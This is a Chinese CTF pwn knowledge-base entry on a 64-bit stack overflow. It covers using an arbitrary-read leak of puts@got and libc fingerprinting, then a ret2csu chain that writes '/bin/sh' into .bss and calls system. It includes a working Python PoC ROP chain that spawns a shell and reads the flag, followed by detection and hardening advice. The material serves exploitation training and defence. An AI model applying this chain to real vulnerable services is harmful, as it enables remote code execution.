---
id: binary-pwn-rop-ret2csu-bss-binsh-libc-offset-mismatch
title: ret2csu 写 /bin/sh 到 bss：libc 符号偏移正确但字符串偏移不一致时的栈溢出利用
type: scenario
domain: binary
path: binary/pwn/rop
technique: ret2csu-bss-binsh-libc-string-mismatch
tags:
- pwn
- rop
- ret2csu
- ret2libc
- got-leak
- arbitrary-read
- bss
- stack-alignment
- libc-fingerprint
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V108
  verified_at: '2026-11-05T22:36:37+08:00'
  notes: 对照 Pwn466：puts@got 泄露、libc6 2.36 偏移、/bin/sh 偏移失效、ret2csu 写 bss 与栈对齐一致；未复跑
url: /docs/binary/pwn/rop/binary-pwn-rop-ret2csu-bss-binsh-libc-offset-mismatch/
draft: false
kb_aliases:
- Boundary ret2csu
- 任意读 + ret2libc
- scanf %lx 指针解引用泄露
- GOT 低 12 位 libc 指纹
- csu gadget read bss
- /bin/sh 偏移不一致
- 栈对齐 movaps
---

## 一句话结论

无 canary、无 PIE、NX 的 64 位栈溢出题中，若下载的 libc 符号偏移（system、puts）都对得上、但 `/bin/sh` 字符串偏移在远程读到空字节，可先用 ret2csu 调 `read(0, bss, 0x10)` 把 `/bin/sh` 写进 .bss，再用 `pop rdi; ret` + `system(bss)` 完成利用，彻底摆脱对字符串段偏移的依赖。

## 原理

- 程序用 `scanf("%lx")` 读取十六进制“设备 ID”，再把它当指针 `printf("%lu", *(long*)id)` 解引用——形成任意读：输入任意地址即可读出该地址的 8 字节值。输入必须是十六进制，按十进制发会被解析成错误地址并段错误。
- 栈溢出：`buf` 位于 `rbp-0x30`，却 `read(0, buf, 0x100)`，到返回地址偏移 `0x38`；无 canary、无 PIE，可直接覆盖返回地址。
- libc 泄露：`main` 在调用 `vuln` 前已经调用过 `puts`，GOT 中 `puts@got` 已解析为真实地址。把设备 ID 设为 `puts@got`（0x601018），`printf("%lu")` 打出真实地址，减去 `puts` 在 libc 中的偏移即得基址。
- 版本判定：多次连接分别泄露 `puts/printf/setvbuf/fflush/__libc_start_main` 五个 GOT 条目，只取低 12 位拼成特征查库；本题命中 libc6 2.36（Debian 12），`puts=0x77980`、`system=0x4c490`。
- 字符串偏移陷阱：按下载的 libc 计算 `/bin/sh` 偏移（0x196031），远程读到空字节——符号偏移一致但字符串段偏移不一致。与其在版本库里翻找字符串偏移完全一致的 libc，不如让 payload 自带字符串。
- ret2csu 两段 gadget：
  - `csu1=0x40093a`：从栈上弹出 6 个寄存器（rbx、rbp、r12、r13、r14、r15），然后跳到 `csu2`；
  - `csu2=0x400920`：执行 `mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12 + rbx*8]`，之后 `add rsp, 8` 再弹 6 个寄存器返回。
  设 `r12=read@got`、`rbx=0`、`r13=0x10`、`r14=bss`、`r15=0`，即调用 `read(0, bss, 0x10)`，从 stdin 读入 `/bin/sh\0` 到 .bss。
- 随后用 libc 的 `pop rdi; ret`（base+0x277e5）把 rdi 指向 bss，再调 `system`。字符串不再依赖 libc 数据段偏移。
- 栈对齐：`vuln` 以 `leave; ret` 返回时 rsp 16 字节对齐；csu1 弹 6 个寄存器（48 字节）对齐不变；csu2 尾部 `add rsp,8` 再弹 6 个，到 `pop rdi` 时 rsp 处于 8 对齐——`pop` 一次加 `ret`，进入 `system` 瞬间 `rsp%16==8`，满足 `movaps` 要求。原文实测链尾加 1 个 `ret` 崩、加 2 个成功，与推导一致。

## 触发条件

- 64 位 ELF，栈溢出可控返回地址，无 canary、无 PIE（或已泄露 PIE），NX 开启。
- 存在任意读/格式化泄露等原语可泄露 GOT 中的 libc 地址。
- 已知或可指纹识别 libc 版本，`system`/`read` 等符号偏移可用。
- 二进制中存在可用的 `__libc_csu_init` gadget（csu1/csu2），或等价的可控调用 gadget。

## 利用步骤

1. `checksec`：确认 RELRO/Canary/NX/PIE；定位溢出偏移与任意读入口。
2. 用 `puts@got` 等地址泄露 libc 基址；必要时泄露多个 GOT 条目低 12 位做版本指纹。
3. 计算 `pop rdi; ret`、`system`、`read@got`、`.bss` 地址；确认 `/bin/sh` 字符串偏移是否可用。
4. 若字符串偏移不可用，构造 ret2csu 链调用 `read(0, bss, 0x10)`，随后发送 `/bin/sh\0`。
5. 链尾接 `pop rdi; ret` + `bss` + `system`；注意栈对齐，必要时在链中插入 `ret` 调整。
6. 进入 shell 后读取 flag。

## PoC

```python
PUTS_GOT, READ_GOT = 0x601018, 0x601028
GADGET1, GADGET2 = 0x40093a, 0x400920
BSS, RET_OFF = 0x601800, 0x38
OFF_PUTS, OFF_POPRDI, OFF_SYSTEM = 0x77980, 0x277e5, 0x4c490

s.sendall(b"%x\n" % PUTS_GOT)                 # 任意读：puts@got
puts = int(re.search(rb"Content:\s*(\d+)", data).group(1))
libc = puts - OFF_PUTS

chain  = b"A" * RET_OFF
# csu1: pop rbx, rbp, r12, r13, r14, r15
chain += p64(GADGET1) + p64(0) + p64(1) + p64(READ_GOT) + p64(0x10) + p64(BSS) + p64(0)
# csu2: read(0, BSS, 0x10)
chain += p64(GADGET2) + p64(0) * 7
# pop rdi; ret -> BSS; system(BSS)
chain += p64(libc + OFF_POPRDI) + p64(BSS) + p64(libc + OFF_SYSTEM)

s.sendall(chain)
time.sleep(0.4)
s.sendall(b"/bin/sh\x00")                     # 写入 .bss
s.sendall(b"cat /flag /flag.txt 2>/dev/null; echo END\n")
```

```python
# csu2 语义
# mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword ptr [r12 + rbx*8]
```

## 变体与关联

- 变体：把 `read` 换成 `gets`/`scanf`，或把字符串写进可写段的其他位置；用 `one_gadget` 时需满足约束。
- 变体：无 csu gadget 时可用 `pop rdx; pop rsi; ...` 等散装 gadget、`setcontext`/SROP、`ret2dlresolve`。
- 关联：[[binary-pwn-stack-ret2libc]]（通用 ret2libc 流程）、[[binary-pwn-rop-static-link-ret2system-sh]]（静态链接的 ret2system）、[[binary-pwn-stack-ret2dlresolve-partial-relro-64-fake-reloc]]（无 libc 时的替代路径）。
- 边界：libc 版本必须匹配符号偏移；栈对齐错误会在 `system` 内 `movaps` 崩溃；csu gadget 依赖编译器生成的 `__libc_csu_init`，新工具链可能没有。

## 检测与防御

- 检测：崩溃栈中出现 csu gadget/`.bss` 地址、GOT 被频繁读取、异常 `scanf("%lx")` 输入；进程执行 `/bin/sh` 或读取 flag。
- 修复：开启 Canary、PIE、Full RELRO；移除任意读原语（不要用用户输入当指针）；用 `read` 前限制长度；编译时移除/保留 csu gadget 的可用性并非可靠防护。
- 加固：ASLR + PIE + Full RELRO + seccomp；最小权限运行；对崩溃/异常输入做监控；使用 CFI/CET 等控制流保护。
